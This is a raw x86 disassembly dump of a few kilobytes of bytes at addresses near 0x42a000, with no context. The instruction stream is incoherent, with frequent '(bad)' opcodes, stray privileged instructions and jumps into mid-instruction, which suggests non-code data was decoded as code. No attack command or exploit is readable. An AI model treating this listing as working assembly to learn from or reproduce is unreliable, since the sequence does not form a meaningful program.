  429f09:	data16 or dh,cl
  429f0c:	pop    es
  429f0d:	xor    ah,BYTE PTR [esi+0x0]
  429f10:	add    bh,al
  429f12:	cld    
  429f13:	cld    
  429f14:	add    BYTE PTR [ebp+0x38c3f866],al
  429f1a:	ss pushf 
  429f1c:	add    BYTE PTR [esi+0x66],ah
  429f1f:	into   
  429f20:	ret    
  429f21:	pop    ebp
  429f22:	add    al,0x57
  429f24:	add    BYTE PTR [edi-0x723c409a],dh
  429f2a:	add    edi,edi
  429f2c:	jne    0x429f7e
  429f2e:	lea    edx,[ecx+0x1]
  429f31:	mov    ebx,0xd64ff1
  429f36:	sar    DWORD PTR [ebx],1
  429f38:	test   BYTE PTR [ebp+0x30],dh
  429f3b:	mov    DWORD PTR [esp+edi*8-0x76],esp
  429f3f:	push   edi
  429f40:	xor    BYTE PTR [ebx],0x3b
  429f43:	mov    esi,ebx
  429f45:	xor    eax,DWORD PTR [eax-0x3c73879a]
  429f4b:	xor    BYTE PTR [ebp+0x64],al
  429f4e:	pop    ebx
  429f4f:	mov    ebx,0x9c3a37
  429f54:	je     0x429f81
  429f56:	xor    edi,DWORD PTR [ebx+0x668a33]
  429f5c:	mov    WORD PTR [ebx],?
  429f5e:	xor    BYTE PTR [ebx+0x8b4f64],bh
  429f64:	pop    edi
  429f65:	cmp    ecx,ecx
  429f67:	jne    0x429fbe
  429f69:	mov    ebp,esp
  429f6b:	cld    
  429f6c:	push   esi
  429f6d:	pop    ebx
  429f6e:	inc    ebp
  429f6f:	stc    
  429f70:	aaa    
  429f71:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  429f78:	clc    
  429f79:	test   dl,dl
  429f7b:	xor    bh,bh
  429f7d:	fs pop si
  429f80:	or     bl,al
  429f82:	cld    
  429f83:	mov    eax,DWORD PTR [eax]
  429f85:	push   ecx
  429f86:	push   di
  429f88:	retf   0x3645
  429f8b:	aaa    
  429f8c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429f93:	clc    
  429f94:	add    BYTE PTR [ebx+0x66],bl
  429f97:	dec    edx
  429f99:	mov    edx,DWORD PTR [edi-0x76]
  429f9c:	push   edi
  429f9d:	add    al,0xb7
  429f9f:	xor    al,0xba
  429fa1:	cmp    al,0x8d
  429fa3:	je     0x429fa4
  429fa5:	mov    edx,DWORD PTR [eax-0x46]
  429fa8:	push   ecx
  429fa9:	lea    edi,[ebx+0x504fff]
  429faf:	push   ecx
  429fb0:	cmp    edx,DWORD PTR [ebx+0x75]
  429fb3:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429fb9:	add    BYTE PTR [ebx],dh
  429fbb:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429fc1:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429fc8:	mov    ebx,0x3b3a00
  429fcd:	jne    0x429ffa
  429fcf:	mov    DWORD PTR [ebx+0x728afc],edi
  429fd5:	xor    esi,DWORD PTR [ebx]
  429fd7:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  429fdd:	push   edi
  429fde:	cmp    esp,ebp
  429fe0:	jne    0x429fe2
  429fe2:	sbb    DWORD PTR [eax],0x8085c3fc
  429fe8:	clc    
  429fe9:	inc    ebx
  429fea:	pop    ebx
  429feb:	sti    
  429fec:	add    eax,0xeb8bc075
  429ff1:	cld    
  429ff2:	xor    edi,DWORD PTR ds:0xf8c3855e
  429ff8:	mov    ecx,DWORD PTR [ecx+edx*2]
  429ffb:	rol    DWORD PTR [ebp-0x37],0xf
  429fff:	mov    DWORD PTR [eax],ecx
  42a001:	inc    edi
  42a002:	(bad)  
  42a003:	in     eax,0x4
  42a005:	add    bh,bh
  42a007:	(bad)  
  42a008:	mov    esi,0xc38a5e
  42a00d:	mov    esi,DWORD PTR [ebx]
  42a00f:	push   ecx
  42a010:	mov    edi,0xfc4fc7
  42a015:	test   DWORD PTR [ebp-0x8],edx
  42a018:	data16 cmp bh,al
  42a01b:	pushf  
  42a01c:	sub    ebp,eax
  42a01e:	inc    ebp
  42a01f:	(bad)  
  42a020:	sub    edi,edi
  42a022:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  42a028:	inc    ebp
  42a029:	add    BYTE PTR [esi+0x2b],ah
  42a02c:	or     bh,BYTE PTR [edx+0xf8ac2]
  42a032:	cmp    al,0x33
  42a034:	mov    edi,DWORD PTR [edx+0x44f81]
  42a03a:	(bad)  
  42a03b:	cmp    esi,DWORD PTR [ebx]
  42a03d:	je     0x429ff7
  42a03f:	push   ebx
  42a040:	dec    edi
  42a041:	str    ecx
  42a044:	cmp    ebp,DWORD PTR [eax+0x75]
  42a047:	int    0x33
  42a049:	mov    edi,0x789085f
  42a04e:	mov    eax,DWORD PTR [esp+edi*8]
  42a051:	add    cl,cl
  42a053:	data16 add al,0xcb
  42a056:	push   ebp
  42a057:	add    ebp,esp
  42a059:	jne    0x42a047
  42a05b:	(bad)  
  42a05c:	mov    DWORD PTR [ecx],0xd685f7ec
  42a062:	clc    
  42a063:	xlat   BYTE PTR ds:[ebx]
  42a064:	inc    ebp
  42a065:	mov    edi,DWORD PTR [ecx]
  42a067:	push   eax
  42a068:	pushf  
  42a069:	in     eax,0x8b
  42a06b:	add    ah,ch
  42a06d:	cld    
  42a06e:	push   eax
  42a06f:	add    BYTE PTR [ecx+0x66],dl
  42a072:	add    eax,0x3672cb
  42a077:	add    BYTE PTR [ebp+0x66],al
  42a07a:	(bad)  
  42a07b:	retf   
  42a07c:	lock xor al,BYTE PTR [ebp+0x4566f800]
  42a083:	retf   
  42a084:	cmp    al,0xc8
  42a086:	pushf  
  42a087:	jge    0x42a050
  42a089:	aaa    
  42a08a:	cld    
  42a08b:	pushf  
  42a08c:	test   DWORD PTR [edi-0x8],ebx
  42a08f:	je     0x42a0d6
  42a091:	xor    esi,DWORD PTR ds:0x7020840
  42a097:	ror    BYTE PTR [ebp-0x37],0x8d
  42a09b:	push   ebp
  42a09c:	add    esp,ebp
  42a09e:	jb     0x42a02b
  42a0a0:	add    BYTE PTR [eax],cl
  42a0a2:	dec    ebp
  42a0a3:	mov    bh,0x81
  42a0a5:	push   esi
  42a0a6:	push   eax
  42a0a7:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42a0ae:	xor    al,BYTE PTR [eax]
  42a0b0:	mov    edx,DWORD PTR [edi+0x10]
  42a0b3:	(bad)  
  42a0b4:	scas   eax,DWORD PTR es:[edi]
  42a0b5:	xor    bh,BYTE PTR [ebx]
  42a0b7:	add    BYTE PTR [edi],cl
  42a0b9:	mov    ebp,ebp
  42a0bb:	cld    
  42a0bc:	add    BYTE PTR [ebx],bh
  42a0be:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  42a0c2:	dec    ebp
  42a0c3:	or     BYTE PTR [ebx],ch
  42a0c5:	ret    0x458b
  42a0c8:	lock jmp 0x42a0bc
  42a0cb:	mov    ecx,DWORD PTR [eax]
  42a0cd:	or     BYTE PTR [edi],al
  42a0cf:	mov    ecx,eax
  42a0d1:	xor    DWORD PTR [edx+0x2],0x0
  42a0d5:	mov    bh,0xc1
  42a0d7:	adc    BYTE PTR [eax],dh
  42a0d9:	iret   
  42a0da:	inc    ebp
  42a0db:	mov    DWORD PTR [ebx],0x4dfff8c5
  42a0e1:	inc    BYTE PTR [ebx]
  42a0e3:	xor    bh,al
  42a0e5:	add    BYTE PTR [ecx],dl
  42a0e7:	data16 adc al,bh
  42a0ea:	dec    ecx
  42a0eb:	fisttp WORD PTR [ecx+0x456604c0]
  42a0f1:	add    dh,BYTE PTR ds:0x75e0845
  42a0f7:	ret    0x4d
  42a0fa:	lea    ecx,[ebx+0x18728301]
  42a100:	add    BYTE PTR [ebp+0x45],al
  42a103:	cmp    cl,ch
  42a105:	pushf  
  42a106:	add    bh,al
  42a108:	add    al,ch
  42a10a:	inc    ebp
  42a10b:	test   DWORD PTR [ebx-0x3eba0708],ecx
  42a111:	xor    eax,0x781084d
  42a116:	push   eax
  42a117:	cwde   
  42a118:	push   ecx
  42a119:	xor    al,BYTE PTR [ecx+0x32f89889]
  42a11f:	inc    ebp
  42a120:	cmp    esp,DWORD PTR [eax]
  42a122:	jbe    0x42a0c0
  42a124:	mov    eax,edi
  42a126:	or     ah,dh
  42a128:	inc    ebp
  42a129:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  42a12f:	cmp    cl,BYTE PTR [ebx-0x74747664]
  42a135:	in     al,dx
  42a136:	hlt    
  42a137:	push   eax
  42a138:	push   eax
  42a139:	push   ecx
  42a13a:	push   ecx
  42a13b:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  42a141:	cwde   
  42a142:	cwde   
  42a143:	xor    dh,BYTE PTR [edx]
  42a145:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  42a14b:	or     BYTE PTR [ebp+0x7],al
  42a14e:	mov    eax,ecx
  42a150:	clc    
  42a151:	jb     0x42a114
  42a153:	add    BYTE PTR [ebp+0x55],cl
  42a156:	or     DWORD PTR [edi],0xc251d150
  42a15c:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  42a166:	mov    edi,eax
  42a168:	or     cl,al
  42a16a:	inc    ebp
  42a16b:	dec    ebp
  42a16c:	mov    eax,DWORD PTR [ecx+0x514d500c]
  42a172:	or     WORD PTR [ecx],0x8998
  42a177:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  42a17d:	mov    edx,DWORD PTR [ecx+0x8]
  42a180:	mov    eax,DWORD PTR [ebp-0x8]
  42a183:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  42a18a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  42a190:	inc    ebp
  42a191:	dec    eax
  42a192:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  42a198:	add    edx,DWORD PTR [ecx-0x8]
  42a19b:	mov    ecx,DWORD PTR [ecx]
  42a19d:	clc    
  42a19e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  42a1a5:	mov    ecx,ebp
  42a1a7:	clc    
  42a1a8:	(bad)  
  42a1a9:	popf   
  42a1aa:	inc    DWORD PTR [eax]
  42a1ac:	ret    0x8b
  42a1af:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  42a1b5:	mov    edi,esp
  42a1b7:	hlt    
  42a1b8:	test   ecx,esi
  42a1ba:	clc    
  42a1bb:	or     BYTE PTR [ebp+0x7],al
  42a1be:	cmp    ecx,eax
  42a1c0:	pushf  
  42a1c1:	jb     0x42a1f6
  42a1c3:	add    BYTE PTR [eax-0x3f],al
  42a1c6:	inc    eax
  42a1c7:	daa    
  42a1c8:	inc    ebp
  42a1c9:	inc    ebp
  42a1ca:	xor    eax,0x7f80803
  42a1cf:	dec    ebp
  42a1d0:	cwde   
  42a1d1:	add    esi,DWORD PTR [edx]
  42a1d3:	clc    
  42a1d4:	cmp    DWORD PTR [ecx],ecx
  42a1d6:	or     al,0x8
  42a1d8:	add    al,BYTE PTR [ebp+0x2c]
  42a1db:	xor    eax,0x7350845
  42a1e0:	or     BYTE PTR [ebp+0x7],cl
  42a1e3:	lea    ebx,[eax-0x748dcdff]
  42a1e9:	add    BYTE PTR [eax*2-0x74b21438],cl
  42a1f0:	mov    edx,DWORD PTR [eax]
  42a1f2:	cld    
  42a1f3:	dec    ebp
  42a1f4:	push   eax
  42a1f5:	sub    edx,DWORD PTR [ecx-0x75]
  42a1f8:	add    eax,0xf172fc
  42a1fd:	or     BYTE PTR [ebp+0x7],cl
  42a200:	add    eax,ecx
  42a202:	or     al,0x72
  42a204:	add    DWORD PTR [eax],eax
  42a206:	mov    ebx,0x29c2c1
  42a20b:	inc    ebp
  42a20c:	mov    eax,DWORD PTR [ebx]
  42a20e:	cmp    eax,0x3004d1c
  42a214:	xbegin 0x66c82e0e
  42a21a:	clc    
  42a21b:	or     BYTE PTR [ebp+0x45],al
  42a21e:	cmp    DWORD PTR ds:0x78b089c,esi
  42a224:	adc    BYTE PTR [ebp+0x45],cl
  42a227:	lea    eax,[ebp+0x33727501]
  42a22d:	add    cl,ch
  42a22f:	inc    ebp
  42a230:	add    bl,ch
  42a232:	add    BYTE PTR [ebx+0x45850845],cl
  42a238:	je     0x42a1c5
  42a23a:	push   ebx
  42a23b:	or     al,0x85
  42a23d:	dec    ebp
  42a23e:	std    
  42a23f:	mov    bh,bh
  42a241:	mov    BYTE PTR [ebp-0x75],al
  42a244:	mov    edi,eax
  42a246:	or     al,0x89
  42a248:	inc    ebp
  42a249:	clc    
  42a24a:	mov    esp,esp
  42a24c:	hlt    
  42a24d:	call   DWORD PTR [edi-0x37]
  42a250:	push   eax
  42a251:	or     al,0x51
  42a253:	push   ebp
  42a254:	xor    ebp,esp
  42a256:	mov    esi,0x457251
  42a25b:	cmp    dh,al
  42a25d:	pushf  
  42a25e:	inc    ebp
  42a25f:	(bad)  
  42a260:	mov    edi,eax
  42a262:	or     al,0x85
  42a264:	add    al,bh
  42a266:	inc    eax
  42a268:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  42a26c:	or     ah,bh
  42a26e:	inc    eax
  42a26f:	push   eax
  42a270:	jmp    0x42a2c3
  42a272:	mov    eax,DWORD PTR ds:0xe8720c
  42a278:	mov    DWORD PTR [ebp-0x8],eax
  42a27b:	jne    0x42a2c2
  42a27d:	jmp    0x42a20a
  42a27f:	mov    ebp,DWORD PTR [eax]
  42a281:	clc    
  42a282:	retf   0xff50
  42a285:	push   ecx
  42a286:	mov    DWORD PTR ds:0x757210,eax
  42a28c:	mov    ecx,DWORD PTR [ebp-0x4]
  42a28f:	sub    esp,DWORD PTR [ebx-0x77]
  42a292:	dec    DWORD PTR [eax*4-0x74ca8abb]
  42a299:	or     ah,bh
  42a29b:	pop    es
  42a29c:	ds cwde 
  42a29e:	push   DWORD PTR [edx]
  42a2a0:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  42a2a6:	(bad)  
  42a2a7:	mov    bh,bh
  42a2a9:	jmp    0x42a297
  42a2ab:	leave  
  42a2ac:	jne    0x42a2b6
  42a2ae:	call   0x2f9c08
  42a2b3:	in     al,dx
  42a2b4:	dec    ebp
  42a2b5:	add    dh,BYTE PTR [ebx]
  42a2b7:	add    BYTE PTR [ebx],al
  42a2b9:	inc    ebp
  42a2ba:	cmp    edi,DWORD PTR [eax]
  42a2bc:	je     0x42a25a
  42a2be:	mov    eax,edi
  42a2c0:	or     al,0xf0
  42a2c2:	add    BYTE PTR [ebp+0x458bf845],al
  42a2c8:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  42a2ce:	adc    al,0x7
  42a2d0:	enter  0x9fc0,0xa5
  42a2d4:	rol    BYTE PTR [eax],0x5e
  42a2d7:	mov    ecx,ecx
  42a2d9:	or     al,0xc
  42a2db:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  42a2e2:	jmp    0x42a2e3
  42a2e4:	push   ebp
  42a2e5:	mov    esp,ebp
  42a2e7:	cld    
  42a2e8:	inc    ebp
  42a2e9:	inc    ebp
  42a2ea:	or     DWORD PTR [ecx+0x457dec10],0x0
  42a2f1:	push   esi
  42a2f2:	push   esi
  42a2f3:	mov    edi,0x7af080f
  42a2f8:	add    bh,al
  42a2fa:	test   DWORD PTR [eax+0x3a7320f],ebx
  42a300:	add    BYTE PTR [ecx+0x4540100f],cl
  42a306:	mov    ebp,eax
  42a308:	mov    ebp,edi
  42a30a:	lock call edx
  42a30d:	fcom   DWORD PTR [ebp+0x45]
  42a310:	mov    eax,0x148a8b
  42a315:	push   ecx
  42a316:	enter  0xc145,0x83
  42a31a:	cmp    cl,BYTE PTR [eax]
  42a31c:	add    BYTE PTR [ebp+0x4d],al
  42a31f:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  42a325:	call   0xffa29e94
  42a32a:	cmp    eax,DWORD PTR [ebp-0xc]
  42a32d:	jmp    DWORD PTR [eax+edx*1-0x4e]
  42a331:	push   ebp
  42a332:	(bad)
  42a335:	std    
  42a336:	lock push DWORD PTR [edi+0x5d08fcdb]
  42a33d:	inc    ebp
  42a33e:	(bad)  
  42a33f:	call   0xff7c9fcf
  42a344:	add    al,BYTE PTR [ebp+0x37]
  42a347:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  42a34d:	jne    0x42a34f
  42a34f:	(bad)  
  42a350:	cmp    edi,esp
  42a352:	jne    0x42a385
  42a354:	mov    edi,edi
  42a356:	or     BYTE PTR [ebx-0x307f0b49],cl
  42a35c:	pop    ds
  42a35d:	into   
  42a35e:	je     0x42a321
  42a360:	mov    ebx,DWORD PTR [esi]
  42a362:	or     BYTE PTR [ebp-0x49],al
  42a365:	mov    esp,DWORD PTR [esi-0x77]
  42a368:	mov    esi,0xfc451f0c
  42a36d:	mov    eax,DWORD PTR [eax]
  42a36f:	or     al,0x66
  42a371:	sar    bl,0x3b
  42a374:	xor    esi,DWORD PTR [ebp+0x66]
  42a377:	xor    ecx,edi
  42a379:	pop    edi
  42a37a:	adc    bl,BYTE PTR [ebx+0x78]
  42a37d:	ret    0xff
  42a380:	cld    
  42a381:	inc    ebp
  42a382:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  42a388:	cld    
  42a389:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  42a390:	push   0xffffff83
  42a392:	pop    edi
  42a393:	or     BYTE PTR [ebp+0x53],dh
  42a396:	xorps  xmm1,xmm2
  42a399:	test   BYTE PTR [eax+eax*1],bh
  42a39c:	add    BYTE PTR [eax],al
  42a39e:	adc    eax,eax
  42a3a0:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  42a3a8:	jmp    DWORD PTR [eax]
  42a3aa:	ror    al,0x5e
  42a3ad:	inc    ebp
  42a3ae:	leave  
  42a3af:	xor    ecx,DWORD PTR [eax]
  42a3b1:	and    DWORD PTR [ebx-0x3ec90708],ecx
  42a3b7:	add    ch,al
  42a3b9:	xor    edi,edi
  42a3bb:	xor    DWORD PTR [ebx],0x660033fc
  42a3c1:	mov    DWORD PTR [ebp-0xc],ecx
  42a3c4:	pcmpgtw mm0,mm0
  42a3c7:	add    dl,ah
  42a3c9:	leave  
  42a3ca:	mov    edi,DWORD PTR [esi-0x7d]
  42a3cd:	push   ax
  42a3cf:	dec    ebp
  42a3d0:	mov    esi,DWORD PTR [ebx-0x75]
  42a3d3:	lea    ebp,[eax-0x7c00fffc]
  42a3d9:	xor    eax,DWORD PTR [eax]
  42a3db:	sysret 
  42a3dd:	dec    ebp
  42a3de:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  42a3e5:	push   WORD PTR [ecx+0x8]
  42a3e9:	jne    0x42a3ac
  42a3eb:	ud0    ecx,DWORD PTR [ecx]
  42a3ee:	mov    esi,DWORD PTR [edx]
  42a3f0:	lods   al,BYTE PTR ds:[esi]
  42a3f1:	add    BYTE PTR [eax],al
  42a3f3:	data16 (bad) 
  42a3f5:	iret   
  42a3f6:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  42a3fd:	cli    
  42a3fe:	inc    ebp
  42a3ff:	cmp    al,0x8d
  42a401:	add    BYTE PTR [esi+0x2d],ah
  42a404:	inc    ebp
  42a405:	pop    ebp
  42a406:	lea    ecx,[edi]
  42a408:	mov    dl,bh
  42a40a:	add    BYTE PTR [edi],cl
  42a40c:	mov    DWORD PTR [eax+eax*8],edi
  42a40f:	mov    ebx,0x3a87
  42a414:	add    BYTE PTR [ebx],ch
  42a416:	inc    ebp
  42a417:	data16 (bad) 
  42a419:	clc    
  42a41a:	int3   
  42a41b:	cmp    eax,DWORD PTR [eax]
  42a41d:	je     0x42a3a8
  42a41f:	push   0xffffffc8
  42a421:	pop    edi
  42a422:	xchg   DWORD PTR [ebp+0x0],eax
  42a425:	data16 add BYTE PTR [ebp+0x45],cl
  42a429:	lea    cx,[ebp+0x10]
  42a42d:	jb     0x42a42f
  42a42f:	jmp    0x42a3ba
  42a431:	call   eax
  42a433:	clc    
  42a434:	xchg   DWORD PTR [edi+0x1],edi
  42a437:	mov    eax,DWORD PTR [eax]
  42a439:	or     BYTE PTR [ebp-0x49],al
  42a43c:	lea    eax,[eax+0x74003154]
  42a442:	push   edi
  42a443:	inc    edx
  42a444:	jge    0x42a445
  42a446:	mov    DWORD PTR [edi],ecx
  42a448:	fdiv   DWORD PTR [edi-0x6]
  42a44b:	inc    DWORD PTR [eax]
  42a44d:	xor    edx,DWORD PTR [eax+0x5f]
  42a450:	xchg   DWORD PTR [ebx+0x1],ebx
  42a453:	ret    0x0
  42a456:	xor    BYTE PTR [ebp-0x51],cl
  42a459:	cmp    edi,0xf0ff8904
  42a45f:	data16 ror al,0x84
  42a463:	rol    BYTE PTR [eax],0x3b
  42a466:	add    al,dh
  42a468:	dec    eax
  42a469:	xchg   esp,eax
  42a46a:	push   ebx
  42a46b:	jmp    0x42a3f8
  42a46d:	push   ebp
  42a46e:	add    esp,ebp
  42a470:	add    ebp,esp
  42a472:	mov    edx,DWORD PTR [edi+0x24]
  42a475:	clc    
  42a476:	dec    esi
  42a477:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  42a47d:	cmp    BYTE PTR [ebx],al
  42a47f:	jne    0x42a40a
  42a481:	xor    esp,eax
  42a483:	jmp    0x45a606
  42a488:	add    ebp,DWORD PTR [ecx+ecx*4]
  42a48b:	jne    0x42a481
  42a48d:	call   0xffcca1e7
  42a492:	clc    
  42a493:	xchg   edi,eax
  42a494:	sti    
  42a495:	add    DWORD PTR [ebx],eax
  42a497:	add    BYTE PTR [ebp+0x47],bl
  42a49a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  42a4a0:	pop    ebp
  42a4a1:	mov    DWORD PTR [esi-0x48],esi
  42a4a4:	jmp    0x42a4ed
  42a4a6:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  42a4ac:	(bad)  
  42a4ae:	cmp    al,0x0
  42a4b0:	cmp    eax,DWORD PTR [ebp+0x18]
  42a4b3:	lea    ebx,[ebp-0x56]
  42a4b6:	jle    0x42a4b8
  42a4b8:	jae    0x42a443
  42a4ba:	mov    eax,esp
  42a4bc:	call   0xb900:0x8b005587
  42a4c3:	inc    ebp
  42a4c4:	push   ebp
  42a4c5:	lea    ecx,[ebp-0x27ff4f12]
  42a4cb:	mov    eax,edi
  42a4cd:	int3   
  42a4ce:	push   ebp
  42a4cf:	xchg   edi,eax
  42a4d1:	add    esp,ebp
  42a4d3:	add    BYTE PTR [eax],al
  42a4d5:	inc    ebp
  42a4d6:	add    BYTE PTR [ebp+0x8b3255],cl
  42a4dc:	cld    
  42a4dd:	mov    DWORD PTR [edx],edi
  42a4df:	aam    0x75
  42a4e1:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  42a4e7:	mov    DWORD PTR [ebx-0x50],edx
  42a4ea:	test   BYTE PTR [ebp-0x1],0xe8
  42a4ee:	mov    eax,DWORD PTR [eax]
  42a4f0:	hlt    
  42a4f1:	add    al,al
  42a4f3:	mov    eax,DWORD PTR ds:0x890045a8
  42a4f9:	dec    DWORD PTR [ebx+0x45fdf0e8]
  42a4ff:	inc    DWORD PTR [eax*2+0xf75854d]
  42a506:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  42a50c:	call   0x7299024d
  42a511:	je     0x42a571
  42a513:	js     0x42a574
  42a515:	lock ret 0x7e
  42a519:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  42a51f:	mov    edi,edi
  42a521:	sbb    al,bl
  42a523:	clc    
  42a524:	add    BYTE PTR [ebp-0x73],bh
  42a527:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  42a52d:	ror    BYTE PTR [eax],1
  42a52f:	dec    ebp
  42a530:	xchg   ebp,eax
  42a531:	mov    edi,edi
  42a533:	in     al,0x8b
  42a535:	jge    0x42a4c0
  42a537:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  42a53d:	clc    
  42a53e:	pop    esi
  42a53f:	fist   DWORD PTR [ebp+0x5d398b5d]
  42a545:	clc    
  42a546:	add    al,0x6e
  42a548:	mov    eax,DWORD PTR [ebx]
  42a54a:	mov    BYTE PTR [ebp+0x0],dl
  42a54d:	mov    edx,DWORD PTR [ebx-0x20]
  42a550:	adc    esi,DWORD PTR [edi+0x5e005f36]
  42a556:	add    eax,0x3b3a73
  42a55b:	adc    al,0x89
  42a55d:	pop    eax
  42a55e:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  42a562:	ret    0xf08
  42a565:	cmp    al,0x2
  42a567:	mov    DWORD PTR [edx],esi
  42a569:	cld    
  42a56a:	add    BYTE PTR [ebp+0x66],dl
  42a56d:	add    eax,ebx
  42a56f:	add    esp,eax
  42a571:	sub    eax,eax
  42a573:	or     BYTE PTR [ecx-0x77f474bb],cl
  42a579:	add    BYTE PTR [eax],al
  42a57b:	mov    DWORD PTR [ebx-0x24],ebx
  42a57e:	push   edi
  42a57f:	push   ebp
  42a580:	clc    
  42a581:	add    DWORD PTR [esi+0x1b0100],0x45
  42a588:	out    0xff,eax
  42a58a:	add    edx,DWORD PTR [eax]
  42a58c:	jmp    0x42a576
  42a58e:	cmp    ch,0x43
  42a591:	(bad)  
  42a592:	jmp    0x40c82de4
  42a597:	je     0x42a523
  42a599:	mov    eax,DWORD PTR [eax-0x10c78704]
  42a59f:	inc    ebp
  42a5a0:	add    BYTE PTR [ebx-0x770375],al
  42a5a6:	add    ah,ch
  42a5a8:	add    edx,esp
  42a5aa:	pop    edi
  42a5ab:	pop    ebp
  42a5ac:	push   ebp
  42a5ad:	inc    ebx
  42a5ae:	in     al,dx
  42a5af:	pop    ebp
  42a5b0:	in     al,dx
  42a5b1:	cmp    edx,DWORD PTR [edi-0x8]
  42a5b4:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  42a5bb:	add    al,0x47
  42a5bd:	push   ebp
  42a5be:	mov    esp,ebp
  42a5c0:	in     al,0x45
  42a5c2:	dec    ebp
  42a5c3:	push   esi
  42a5c4:	test   DWORD PTR [eax+0xff010f],esi
  42a5ca:	add    BYTE PTR [eax+0xc018b],dh
  42a5d0:	leave  
  42a5d1:	inc    ebp
  42a5d2:	test   al,ch
  42a5d4:	add    dh,bh
  42a5d6:	add    bh,bh
  42a5d8:	dec    ebp
  42a5d9:	push   cs
  42a5da:	mov    DWORD PTR [ecx],eax
  42a5dc:	hlt    
  42a5dd:	push   es
  42a5de:	dec    ebp
  42a5df:	leave  
  42a5e0:	mov    DWORD PTR [eax],ecx
  42a5e2:	clc    
  42a5e3:	cmovge eax,ecx
  42a5e6:	mov    ecx,0x85c2f0
  42a5ec:	clc    
  42a5ed:	pop    DWORD PTR [ebp+0x1]
  42a5f0:	aas    
  42a5f1:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  42a5f8:	push   esi
  42a5f9:	add    BYTE PTR [ebp-0x4],al
  42a5fc:	mov    DWORD PTR [eax],eax
  42a5fe:	cld    
  42a5ff:	inc    bp
  42a601:	add    DWORD PTR [edx],edi
  42a603:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  42a60b:	mov    ebx,0xcd4f68
  42a610:	mov    edi,DWORD PTR [ebx]
  42a612:	or     al,0x75
  42a614:	(bad)  
  42a615:	xor    ecx,ebx
  42a617:	enterw 0x4d01,0x87
  42a61c:	jmp    0x42a622
  42a621:	ret    
  42a622:	inc    ebp
  42a623:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  42a629:	add    dh,cl
  42a62b:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  42a633:	icebp  
  42a634:	or     BYTE PTR [eax+0x8f13bd2],al
  42a63a:	inc    ebp
  42a63b:	inc    edx
  42a63c:	mov    ecx,DWORD PTR [edx]
  42a63e:	or     al,0xf9
  42a640:	(bad)  
  42a641:	jne    0x42a611
  42a643:	mov    cl,0x0
  42a646:	rol    BYTE PTR [esi+0x450134],1
  42a64c:	add    eax,edi
  42a64e:	cld    
  42a64f:	ret    
  42a650:	dec    ebp
  42a651:	mov    ecx,DWORD PTR [edx+0x751c8583]
  42a657:	mov    edi,0xf82c8534
  42a65c:	jmp    0x42a6db
  42a65e:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  42a664:	mov    dl,0x8b
  42a666:	sub    cl,BYTE PTR [eax]
  42a668:	mov    ecx,ecx
  42a66a:	in     al,dx
  42a66b:	test   cl,dh
  42a66d:	add    BYTE PTR [edx],al
  42a66f:	add    BYTE PTR [eax-0x377a97b3],al
  42a675:	cmovge esi,esp
  42a678:	add    eax,DWORD PTR [eax]
  42a67a:	cld    
  42a67b:	mov    eax,DWORD PTR [ecx]
  42a67d:	adc    BYTE PTR [ebp+0x4d],cl
  42a680:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  42a686:	xor    cl,BYTE PTR [ebx+0x4533082b]
  42a68c:	cmp    esp,ebx
  42a68e:	jne    0x42a62c
  42a690:	mov    eax,edi
  42a692:	adc    ah,ch
  42a694:	push   ebp
  42a695:	test   DWORD PTR [ebx],esi
  42a697:	clc    
  42a698:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  42a69e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  42a6a1:	dec    ebp
  42a6a2:	adc    bh,al
  42a6a4:	push   0x8b85ff10
  42a6a9:	clc    
  42a6aa:	or     al,0x50
  42a6ac:	(bad)  
  42a6ad:	push   ecx
  42a6ae:	retf   
  42a6af:	mov    ebx,0xff4d8dc8
  42a6b4:	mov    DWORD PTR [ebp+0x8],eax
  42a6b7:	xor    eax,DWORD PTR [ebp-0x75]
  42a6ba:	cmp    ebp,DWORD PTR [ebx]
  42a6bc:	lsl    ebx,WORD PTR [edi-0x8]
  42a6c0:	call   DWORD PTR [ebx-0x741bff75]
